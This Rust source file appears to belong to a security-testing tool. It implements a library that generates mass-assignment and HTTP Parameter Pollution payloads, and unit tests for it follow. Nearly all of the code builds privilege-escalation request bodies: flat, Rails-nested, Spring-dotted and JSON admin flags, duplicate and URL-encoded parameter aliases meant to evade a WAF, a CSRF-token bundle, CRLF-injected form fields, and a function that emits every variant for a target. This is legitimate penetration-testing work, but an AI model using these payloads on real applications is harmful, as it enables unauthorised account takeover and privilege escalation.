//! Mass-assignment & HTTP Parameter Pollution (HPP) payload library.
//!
//! Two related vulnerability classes — both attack the same surface
//! (the parser that takes form / JSON / query params and binds them
//! to model fields) but via different shapes:
//!
//! - **Mass-assignment** (CVE-2012-2660 Rails, GitHub 2012 Egor
//!   Homakov; Spring4Shell CVE-2022-22965): set fields the
//!   application didn't expect the client to control. Classic
//!   payload: `is_admin=true&role=admin`. Modern variants exploit
//!   nested-attribute syntax (`user[admin]=true` in Rails, dotted
//!   path in Spring, `__proto__` in JS).
//!
//! - **HTTP Parameter Pollution** (HPP): submit the SAME parameter
//!   multiple times. Different libraries pick first / last / all /
//!   comma-joined. The WAF and the application disagree on which
//!   value wins. The classic example: `id=1&id=2`. Rails picks last;
//!   PHP picks first; Java may build an array.
//!
//! Coverage:
//!
//! - **Flat mass-assign**: `is_admin=true`, `role=admin`,
//!   `is_active=true`, `verified=true`, `email_verified_at=now`.
//! - **Nested Rails** (`user[admin]=true`): one + N levels of nesting.
//! - **Spring binding** (`user.admin=true`): dotted path.
//! - **JSON nested**: `{"user":{"admin":true}}`.
//! - **Proto pollution shape** that's ALSO mass-assign:
//!   `__proto__[isAdmin]=true`.
//! - **HPP first/last disagreement**: `id=1&id=2&id=3`.
//! - **HPP comma-list**: `id=1,2,3`.
//! - **HPP encoded duplicates**: `id=1&%69d=2`, `id=1&id%2F=2`.
//! - **CSRF-bundle**: `_csrf=valid_token&user[admin]=true`.
//! - **CRLF in form value**: `name=safe%0d%0aadmin=true`.

/// Build a flat mass-assignment payload string. Returns the
/// url-encoded form body (`key1=value1&key2=value2...`).
#[must_use]
pub fn flat_mass_assign(legitimate: &[(&str, &str)], elevated: &[(&str, &str)]) -> String {
    let mut parts: Vec<String> = vec![];
    for (k, v) in legitimate {
        parts.push(format!("{k}={v}"));
    }
    for (k, v) in elevated {
        parts.push(format!("{k}={v}"));
    }
    parts.join("&")
}

/// Build a Rails-style nested mass-assignment payload.
/// `user[admin]=true&user[id]=1`.
#[must_use]
pub fn rails_nested(model: &str, fields: &[(&str, &str)]) -> String {
    fields
        .iter()
        .map(|(k, v)| format!("{model}[{k}]={v}"))
        .collect::<Vec<_>>()
        .join("&")
}

/// Build a Spring-style dotted mass-assignment payload.
/// `user.admin=true&user.id=1`.
#[must_use]
pub fn spring_dotted(model: &str, fields: &[(&str, &str)]) -> String {
    fields
        .iter()
        .map(|(k, v)| format!("{model}.{k}={v}"))
        .collect::<Vec<_>>()
        .join("&")
}

/// Build a JSON-nested mass-assignment payload (the body the
/// operator POSTs with `Content-Type: application/json`).
#[must_use]
pub fn json_nested(model: &str, fields: &[(&str, &str)]) -> String {
    let inner: Vec<String> = fields
        .iter()
        .map(|(k, v)| format!("\"{k}\":\"{v}\""))
        .collect();
    format!("{{\"{model}\":{{{}}}}}", inner.join(","))
}

/// Build a deeply-nested mass-assign payload for a target framework
/// (`a[b][c][d]=x`). Some frameworks parse arbitrary depth and bind
/// to deeply-nested model attributes — useful when the operator
/// doesn't know the exact path.
#[must_use]
pub fn deep_nested(path_segments: &[&str], leaf_value: &str) -> String {
    if path_segments.is_empty() {
        return String::new();
    }
    let head = path_segments[0];
    let brackets: String = path_segments[1..]
        .iter()
        .map(|s| format!("[{s}]"))
        .collect();
    format!("{head}{brackets}={leaf_value}")
}

/// HPP — same parameter, multiple values. Returns
/// `id=1&id=2&id=3` for `("id", [1,2,3])`.
#[must_use]
pub fn hpp_duplicate(name: &str, values: &[&str]) -> String {
    values
        .iter()
        .map(|v| format!("{name}={v}"))
        .collect::<Vec<_>>()
        .join("&")
}

/// HPP — comma-list form. `id=1,2,3`. Some Java frameworks
/// parse this as a list; WAF that splits on `,` sees three values.
#[must_use]
pub fn hpp_comma_list(name: &str, values: &[&str]) -> String {
    format!("{name}={}", values.join(","))
}

/// HPP with URL-encoding variation. Each duplicate is the SAME
/// parameter name but encoded differently (`id` vs `%69d` vs
/// `i%64`). WAF that case-folds OR decodes-once may not match every
/// occurrence; framework that decodes-twice merges them.
#[must_use]
pub fn hpp_encoded_aliases(name: &str, values: &[&str]) -> Vec<String> {
    let mut out = vec![];
    let bytes = name.as_bytes();
    // Encode each byte differently across N variants.
    for (i, v) in values.iter().enumerate() {
        let alias = bytes
            .iter()
            .enumerate()
            .map(|(j, &b)| {
                // For variant i, encode byte j only if (i+j) is even.
                if (i + j) % 2 == 0 && b.is_ascii_alphanumeric() {
                    format!("%{:02x}", b)
                } else {
                    (b as char).to_string()
                }
            })
            .collect::<String>();
        out.push(format!("{alias}={v}"));
    }
    out
}

/// Build a CSRF-bundle: legitimate token + elevated mass-assign.
/// `csrf_token` is the operator-captured token; the elevated fields
/// follow.
#[must_use]
pub fn csrf_bundle(csrf_token: &str, elevated: &[(&str, &str)]) -> String {
    let mut out = format!("_csrf={csrf_token}");
    for (k, v) in elevated {
        out.push_str(&format!("&{k}={v}"));
    }
    out
}

/// CRLF-injection in form value. Some frameworks store the raw
/// value, others process CRLF-bounded sub-fields. The injected line
/// becomes a separate logical field.
#[must_use]
pub fn crlf_form_value(legit_key: &str, legit_value: &str, injected_field: &str) -> String {
    format!("{legit_key}={legit_value}%0d%0a{injected_field}")
}

/// One-shot fan-out: every mass-assignment + HPP shape for a target
/// model+field pair.
#[must_use]
pub fn all_mass_assign_variants(
    model: &str,
    elevated_field: &str,
    elevated_value: &str,
) -> Vec<(&'static str, String)> {
    let mut out = vec![
        (
            "flat",
            flat_mass_assign(&[("name", "safe")], &[(elevated_field, elevated_value)]),
        ),
        (
            "rails-nested",
            rails_nested(model, &[(elevated_field, elevated_value)]),
        ),
        (
            "spring-dotted",
            spring_dotted(model, &[(elevated_field, elevated_value)]),
        ),
        (
            "json-nested",
            json_nested(model, &[(elevated_field, elevated_value)]),
        ),
        (
            "deep-nested",
            deep_nested(&[model, elevated_field], elevated_value),
        ),
        (
            "hpp-duplicate",
            hpp_duplicate(elevated_field, &["safe", elevated_value]),
        ),
        (
            "hpp-comma-list",
            hpp_comma_list(elevated_field, &["safe", elevated_value]),
        ),
        (
            "csrf-bundle",
            csrf_bundle("ABC123", &[(elevated_field, elevated_value)]),
        ),
        (
            "crlf-form",
            crlf_form_value(
                "name",
                "safe",
                &format!("{elevated_field}={elevated_value}"),
            ),
        ),
    ];
    // Add the encoded-aliases variants individually for naming.
    let aliases = hpp_encoded_aliases(elevated_field, &["safe", elevated_value]);
    for (i, a) in aliases.into_iter().enumerate() {
        out.push((
            if i == 0 {
                "hpp-encoded-1"
            } else if i == 1 {
                "hpp-encoded-2"
            } else {
                "hpp-encoded-n"
            },
            a,
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flat_mass_assign_concatenates() {
        let p = flat_mass_assign(&[("name", "Alice")], &[("is_admin", "true")]);
        assert_eq!(p, "name=Alice&is_admin=true");
    }

    #[test]
    fn flat_mass_assign_no_legit_fields() {
        let p = flat_mass_assign(&[], &[("is_admin", "true")]);
        assert_eq!(p, "is_admin=true");
    }

    #[test]
    fn rails_nested_emits_brackets() {
        let p = rails_nested("user", &[("admin", "true")]);
        assert_eq!(p, "user[admin]=true");
    }

    #[test]
    fn rails_nested_multiple_fields() {
        let p = rails_nested("user", &[("admin", "true"), ("id", "1")]);
        assert!(p.contains("user[admin]=true"));
        assert!(p.contains("user[id]=1"));
    }

    #[test]
    fn spring_dotted_emits_dots() {
        let p = spring_dotted("user", &[("admin", "true")]);
        assert_eq!(p, "user.admin=true");
    }

    #[test]
    fn spring_dotted_multiple_fields() {
        let p = spring_dotted("user", &[("a", "1"), ("b", "2")]);
        assert!(p.contains("user.a=1"));
        assert!(p.contains("user.b=2"));
    }

    #[test]
    fn json_nested_well_formed() {
        let p = json_nested("user", &[("admin", "true")]);
        let parsed: Result<serde_json::Value, _> = serde_json::from_str(&p);
        assert!(parsed.is_ok());
        let v = parsed.unwrap();
        assert_eq!(v["user"]["admin"], "true");
    }

    #[test]
    fn json_nested_multiple_fields() {
        let p = json_nested("u", &[("a", "1"), ("b", "2")]);
        let parsed: serde_json::Value = serde_json::from_str(&p).expect("valid");
        assert_eq!(parsed["u"]["a"], "1");
        assert_eq!(parsed["u"]["b"], "2");
    }

    #[test]
    fn deep_nested_two_segments() {
        let p = deep_nested(&["user", "admin"], "true");
        assert_eq!(p, "user[admin]=true");
    }

    #[test]
    fn deep_nested_four_segments() {
        let p = deep_nested(&["a", "b", "c", "d"], "X");
        assert_eq!(p, "a[b][c][d]=X");
    }

    #[test]
    fn deep_nested_empty_path() {
        assert_eq!(deep_nested(&[], "X"), "");
    }

    #[test]
    fn deep_nested_single_segment() {
        let p = deep_nested(&["only"], "X");
        assert_eq!(p, "only=X");
    }

    #[test]
    fn hpp_duplicate_three_values() {
        let p = hpp_duplicate("id", &["1", "2", "3"]);
        assert_eq!(p, "id=1&id=2&id=3");
    }

    #[test]
    fn hpp_duplicate_single_value() {
        let p = hpp_duplicate("id", &["1"]);
        assert_eq!(p, "id=1");
    }

    #[test]
    fn hpp_duplicate_empty() {
        assert_eq!(hpp_duplicate("id", &[]), "");
    }

    #[test]
    fn hpp_comma_list_three_values() {
        let p = hpp_comma_list("id", &["1", "2", "3"]);
        assert_eq!(p, "id=1,2,3");
    }

    #[test]
    fn hpp_encoded_aliases_produces_n_variants() {
        let v = hpp_encoded_aliases("id", &["1", "2", "3"]);
        assert_eq!(v.len(), 3);
    }

    #[test]
    fn hpp_encoded_aliases_each_carries_value() {
        let v = hpp_encoded_aliases("id", &["A", "B"]);
        assert!(v.iter().any(|s| s.ends_with("=A")));
        assert!(v.iter().any(|s| s.ends_with("=B")));
    }

    #[test]
    fn csrf_bundle_starts_with_csrf() {
        let p = csrf_bundle("TOKEN", &[("is_admin", "true")]);
        assert!(p.starts_with("_csrf=TOKEN"));
        assert!(p.contains("is_admin=true"));
    }

    #[test]
    fn csrf_bundle_empty_elevated() {
        let p = csrf_bundle("TOKEN", &[]);
        assert_eq!(p, "_csrf=TOKEN");
    }

    #[test]
    fn crlf_form_value_contains_encoded_crlf() {
        let p = crlf_form_value("name", "safe", "admin=true");
        assert!(p.contains("%0d%0a"));
        assert!(p.contains("admin=true"));
    }

    #[test]
    fn all_variants_minimum_count() {
        let v = all_mass_assign_variants("user", "is_admin", "true");
        assert!(v.len() >= 10);
    }

    #[test]
    fn all_variants_carry_elevated_value() {
        let v = all_mass_assign_variants("user", "is_admin", "UNIQUE_MARKER_42");
        let any_carries = v.iter().any(|(_, p)| p.contains("UNIQUE_MARKER_42"));
        assert!(any_carries);
    }

    #[test]
    fn all_variants_at_least_three_unique_per_class() {
        // Each shape (flat / rails / spring / json / deep / hpp /
        // csrf / crlf / hpp-encoded) should be present.
        let v = all_mass_assign_variants("u", "f", "v");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert!(names.contains(&"flat"));
        assert!(names.contains(&"rails-nested"));
        assert!(names.contains(&"spring-dotted"));
        assert!(names.contains(&"json-nested"));
        assert!(names.contains(&"deep-nested"));
        assert!(names.contains(&"hpp-duplicate"));
        assert!(names.contains(&"hpp-comma-list"));
        assert!(names.contains(&"csrf-bundle"));
        assert!(names.contains(&"crlf-form"));
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_mass_assign_variants("u", "f", "v");
        let b = all_mass_assign_variants("u", "f", "v");
        assert_eq!(a, b);
    }

    #[test]
    fn handles_unicode_field_name() {
        let p = rails_nested("usér", &[("ñame", "vál")]);
        assert!(p.contains("usér"));
        assert!(p.contains("ñame"));
        assert!(p.contains("vál"));
    }

    #[test]
    fn adversarial_long_input_no_panic() {
        let big = "a".repeat(10_000);
        let _ = flat_mass_assign(&[("k", &big)], &[("e", &big)]);
        let _ = rails_nested(&big, &[(&big, &big)]);
        let _ = json_nested(&big, &[(&big, &big)]);
        let _ = deep_nested(&[&big[..], &big[..]], &big);
    }

    #[test]
    fn json_nested_special_chars_in_value() {
        // Library does NOT escape — operator's responsibility for
        // JSON correctness. Test confirms no panic on awkward inputs.
        let p = json_nested("u", &[("a", "with\"quote")]);
        // The output is not valid JSON because we don't escape, but
        // we don't panic.
        assert!(p.contains("with\"quote"));
    }

    #[test]
    fn rails_nested_empty_fields() {
        let p = rails_nested("user", &[]);
        assert_eq!(p, "");
    }
}
